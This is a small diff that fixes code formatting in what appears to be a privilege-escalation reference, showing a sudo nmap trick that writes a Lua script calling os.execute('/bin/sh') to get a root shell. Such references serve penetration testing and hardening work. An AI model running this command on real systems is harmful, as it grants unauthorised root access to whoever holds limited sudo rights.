@@ -636,9 +636,9 @@ sudo ftp
 *(a) Input echo is disabled.*
 
 ```
-`TF=$(mktemp)
+TF=$(mktemp)
 echo 'os.execute("/bin/sh")' > $TF
-sudo nmap --script=$TF`
+sudo nmap --script=$TF
 ```
 
 *(b) The interactive mode, available on versions 2.02 to 5.21, can be used to execute shell commands.
